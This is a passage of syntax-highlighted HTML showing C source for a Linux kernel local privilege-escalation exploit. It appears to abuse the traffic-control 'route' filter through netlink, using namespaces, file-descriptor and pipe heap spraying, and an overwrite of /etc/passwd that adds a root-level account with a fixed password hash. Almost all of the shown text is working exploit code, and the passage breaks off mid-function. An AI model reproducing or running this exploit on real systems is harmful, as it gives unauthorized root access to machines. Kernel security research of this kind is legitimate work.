class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/timerfd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tc_ematch/tc_em_meta.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/capability.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/futex.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/genetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_addr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_link.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_tun.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in6.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kcmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/neighbour.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/net.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/pkt_cls.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/pkt_sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/rtnetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/veth.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// #define DEBUG</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *target = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> *overwrite =</span><br><span class="line">    <span class="string">&quot;user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:root:/root:/bin/bash\n&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> *global;</span><br><span class="line"><span class="keyword">char</span> *self_path;</span><br><span class="line"><span class="keyword">char</span> *content;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_FILE_NUM 0x8000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fds[MAX_FILE_NUM] = &#123;&#125;;</span><br><span class="line"><span class="keyword">int</span> fd_2[MAX_FILE_NUM] = &#123;&#125;;</span><br><span class="line"><span class="keyword">int</span> overlap_a = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> overlap_b = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> cpu_cores = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> sockfd = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> spray_num_1 = <span class="number">2000</span>;</span><br><span class="line"><span class="keyword">int</span> spray_num_2 = <span class="number">4000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// int spray_num_1 = 4000;</span></span><br><span class="line"><span class="comment">// int spray_num_2 = 5000;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pipe_main[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> pipe_parent[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> pipe_child[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> pipe_defrag[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> pipe_file_spray[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> run_write = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> run_spray = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *passwd;</span><br><span class="line"><span class="keyword">bool</span> overlapped = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DumpHex</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    <span class="keyword">char</span> ascii[<span class="number">17</span>];</span><br><span class="line">    <span class="keyword">size_t</span> i, j;</span><br><span class="line">    ascii[<span class="number">16</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)data)[i]);</span><br><span class="line">        <span class="keyword">if</span> (((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)data)[i] &gt;= <span class="string">&#x27; &#x27;</span> &amp;&amp;</span><br><span class="line">            ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)data)[i] &lt;= <span class="string">&#x27;~&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ascii[i % <span class="number">16</span>] = ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)data)[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ascii[i % <span class="number">16</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">8</span> == <span class="number">0</span> || i + <span class="number">1</span> == size)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;|  %s \n&quot;</span>, ascii);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i + <span class="number">1</span> == size)</span><br><span class="line">            &#123;</span><br><span class="line">                ascii[(i + <span class="number">1</span>) % <span class="number">16</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">16</span> &lt;= <span class="number">8</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> (j = (i + <span class="number">1</span>) % <span class="number">16</span>; j &lt; <span class="number">16</span>; ++j)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;|  %s \n&quot;</span>, ascii);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pin_on_cpu</span><span class="params">(<span class="keyword">int</span> cpu)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(cpu, &amp;cpu_set);</span><br><span class="line">    <span class="keyword">if</span> (sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;sched_setaffinity()&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">write_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *file, <span class="keyword">const</span> <span class="keyword">char</span> *what, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    va_list args;</span><br><span class="line">    va_start(args, what);</span><br><span class="line">    vsnprintf(buf, <span class="keyword">sizeof</span>(buf), what, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    buf[<span class="keyword">sizeof</span>(buf) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    <span class="keyword">int</span> fd = open(file, O_WRONLY | O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (write(fd, buf, len) != len)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> err = errno;</span><br><span class="line">        close(fd);</span><br><span class="line">        errno = err;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">use_temporary_dir</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;rm -rf exp_dir; mkdir exp_dir; touch exp_dir/data&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;touch exp_dir/data2&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> *tmpdir = <span class="string">&quot;exp_dir&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!tmpdir)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (chmod(tmpdir, <span class="number">0777</span>))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (chdir(tmpdir))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    symlink(<span class="string">&quot;./data&quot;</span>, <span class="string">&quot;./uaf&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setup_common</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="number">0</span>, <span class="string">&quot;/sys/fs/fuse/connections&quot;</span>, <span class="string">&quot;fusectl&quot;</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">adjust_rlimit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim</span>;</span></span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = (<span class="number">200</span> &lt;&lt; <span class="number">20</span>);</span><br><span class="line">    setrlimit(RLIMIT_AS, &amp;rlim);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">32</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">    setrlimit(RLIMIT_MEMLOCK, &amp;rlim);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">136</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">    <span class="comment">// setrlimit(RLIMIT_FSIZE, &amp;rlim);</span></span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">1</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">    setrlimit(RLIMIT_STACK, &amp;rlim);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">0</span>;</span><br><span class="line">    setrlimit(RLIMIT_CORE, &amp;rlim);</span><br><span class="line">    <span class="comment">// RLIMIT_FILE</span></span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">14096</span>;</span><br><span class="line">    <span class="keyword">if</span> (setrlimit(RLIMIT_NOFILE, &amp;rlim) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        rlim.rlim_cur = rlim.rlim_max = <span class="number">4096</span>;</span><br><span class="line">        spray_num_1 = <span class="number">1200</span>;</span><br><span class="line">        spray_num_2 = <span class="number">2800</span>;</span><br><span class="line">        <span class="keyword">if</span> (setrlimit(RLIMIT_NOFILE, &amp;rlim) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            perror(<span class="string">&quot;setrlimit&quot;</span>);</span><br><span class="line">            err(<span class="number">1</span>, <span class="string">&quot;setrlimit&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup_namespace</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> real_uid = getuid();</span><br><span class="line">    <span class="keyword">int</span> real_gid = getgid();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWUSER) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWNET) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/setgroups&quot;</span>, <span class="string">&quot;deny&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] write_file(/proc/self/set_groups)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/uid_map&quot;</span>, <span class="string">&quot;0 %d 1\n&quot;</span>, real_uid))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] write_file(/proc/self/uid_map)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/gid_map&quot;</span>, <span class="string">&quot;0 %d 1\n&quot;</span>, real_gid))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] write_file(/proc/self/gid_map)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NLMSG_TAIL(nmsg) \</span></span><br><span class="line"><span class="meta">    ((struct rtattr *)(((void *)(nmsg)) + NLMSG_ALIGN((nmsg)-&gt;nlmsg_len)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addattr</span><span class="params">(<span class="keyword">char</span> *attr, <span class="keyword">int</span> type, <span class="keyword">void</span> *data, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">rta</span> =</span> (struct rtattr *)attr;</span><br><span class="line"></span><br><span class="line">    rta-&gt;rta_type = type;</span><br><span class="line">    rta-&gt;rta_len = RTA_LENGTH(len);</span><br><span class="line">    <span class="keyword">if</span> (len)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(RTA_DATA(attr), data, len);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> RTA_LENGTH(len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addattr_l</span><span class="params">(struct nlmsghdr *n, <span class="keyword">int</span> maxlen, <span class="keyword">int</span> type, <span class="keyword">const</span> <span class="keyword">void</span> *data,</span></span></span><br><span class="line"><span class="params"><span class="function">              <span class="keyword">int</span> alen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = RTA_LENGTH(alen);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">rta</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (NLMSG_ALIGN(n-&gt;nlmsg_len) + RTA_ALIGN(len) &gt; maxlen)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;addattr_l ERROR: message exceeded bound of %d\n&quot;</span>, maxlen);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    rta = NLMSG_TAIL(n);</span><br><span class="line">    rta-&gt;rta_type = type;</span><br><span class="line">    rta-&gt;rta_len = len;</span><br><span class="line">    <span class="keyword">if</span> (alen)</span><br><span class="line">        <span class="built_in">memcpy</span>(RTA_DATA(rta), data, alen);</span><br><span class="line">    n-&gt;nlmsg_len = NLMSG_ALIGN(n-&gt;nlmsg_len) + RTA_ALIGN(len);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct rtattr *<span class="title">addattr_nest</span><span class="params">(struct nlmsghdr *n, <span class="keyword">int</span> maxlen, <span class="keyword">int</span> type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">nest</span> =</span> NLMSG_TAIL(n);</span><br><span class="line"></span><br><span class="line">    addattr_l(n, maxlen, type, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> nest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addattr_nest_end</span><span class="params">(struct nlmsghdr *n, struct rtattr *nest)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    nest-&gt;rta_len = (<span class="keyword">void</span> *)NLMSG_TAIL(n) - (<span class="keyword">void</span> *)nest;</span><br><span class="line">    <span class="keyword">return</span> n-&gt;nlmsg_len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_qdisc</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *start = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">msg</span> =</span> (struct nlmsghdr *)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new qdisc</span></span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;</span><br><span class="line">    msg-&gt;nlmsg_type = RTM_NEWQDISC;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span> *<span class="title">t</span> =</span> (struct tcmsg *)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line">    <span class="comment">// set local</span></span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_parent = TC_H_ROOT;</span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_KIND, <span class="string">&quot;sfq&quot;</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    DumpHex(msg, msg-&gt;nlmsg_len);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123;.iov_base = msg, .iov_len = msg-&gt;nlmsg_len&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123;.nl_family = AF_NETLINK&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> sendmsg(fd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_tc_</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">u_int32_t</span> from, <span class="keyword">u_int32_t</span> to, <span class="keyword">u_int32_t</span> handle,</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="keyword">u_int16_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *start = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">msg</span> =</span> (struct nlmsghdr *)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new filter</span></span><br><span class="line">    msg = msg + msg-&gt;nlmsg_len;</span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | flags;</span><br><span class="line">    msg-&gt;nlmsg_type = RTM_NEWTFILTER;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span> *<span class="title">t</span> =</span> (struct tcmsg *)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_handle = handle;</span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_KIND, <span class="string">&quot;route&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">tail</span> =</span> addattr_nest(msg, <span class="number">0x1000</span>, TCA_OPTIONS);</span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_ROUTE4_FROM, &amp;from, <span class="number">4</span>);</span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_ROUTE4_TO, &amp;to, <span class="number">4</span>);</span><br><span class="line">    addattr_nest_end(msg, tail);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123;.iov_base = msg, .iov_len = msg-&gt;nlmsg_len&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123;.nl_family = AF_NETLINK&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        